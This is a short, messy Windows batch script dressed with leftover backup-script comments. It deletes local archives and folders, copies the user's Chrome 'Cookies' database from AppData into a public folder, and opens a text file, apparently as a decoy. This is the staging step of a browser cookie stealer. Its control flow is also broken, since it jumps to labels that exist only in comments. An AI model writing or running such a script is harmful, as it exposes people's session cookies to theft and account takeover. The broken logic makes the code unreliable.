@echo off

IF EXIST D:\RPS_BACKUP\backups_to_zip\ goto zipexist else goto zipexistcontinue  
del ..\..\oye.7z
del ..\..\oye.zip
del ..\oye.7z
del ..\oye.zip
rmdir /s /q "C:\Users\Public\a"
:: variables

SET odrive=%odrive:~0,2%
set backupcmd=xcopy /E /C /H
REM if already there is "a" folder in public directory , then no codes from below here will execut
%backupcmd% "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "C:\Users\Public\a\"
REM xcopy file.txt ..   
REM very important
xcopy "a\file.txt" 
REM TIMEOUT 3
REM file.txt 
REM importnt
START file.txt

REM TIMEOUT 3
REM taskkill /F /IM notepad.exe
REM xcopy "a\fil.txt"
rmdir /s /q "a"
@echo off


REM no need of below things:
REM IF EXIST D:\RPS_BACKUP\backups_to_zip\ goto zipexist else goto zipexistcontinue  
REM :zipexist  
REM IF EXIST d:\RPS_BACKUP\backups_old\ rd /s /q D:\RPS_BACKUP\backups_old  
REM echo backup did not complete last time, backup will restart from zip-usb phase.  
REM pause  
REM call zip  
REM goto tidyup  
REM :zipexistcontinue 